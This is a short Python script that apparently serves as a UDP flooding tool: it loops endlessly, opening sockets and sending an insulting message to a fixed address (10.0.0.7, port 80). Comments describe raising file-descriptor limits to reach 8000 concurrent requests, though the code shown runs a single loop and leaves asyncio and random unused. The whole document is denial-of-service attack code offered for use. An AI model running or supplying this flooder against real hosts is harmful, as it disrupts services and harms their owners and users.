#!/usr/bin/env python3

import socket
import asyncio
import random
import sys

# Delay factor, some noise is added.
DELAY = 1

# Number of concurrent requests that are happening, threads are not used.
# To get this above 1024 on linux, you have to edit /etc/security/limits.conf
# and add a line like vita soft nofile 2000
# and vita hard nofile 40000
# You can check the status of these limits with ulimit -Hn and ulimit -Sn
CONCURRENT_REQUESTS = 8000 
UDP_IP = "10.0.0.7"
UDP_PORT = 80
MESSAGE = "Got you bitch!"

def fl():
    sys.stdout.flush()

# Single thread that will keep attempting to 
# send requests to the server that _will_ time out.
def papercut():
    while True:
        soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fl()
        soc.sendto(bytes(MESSAGE, "utf-8"), (UDP_IP, UDP_PORT))
        print('N', end='')

if __name__ == '__main__':
    import sys
    papercut()
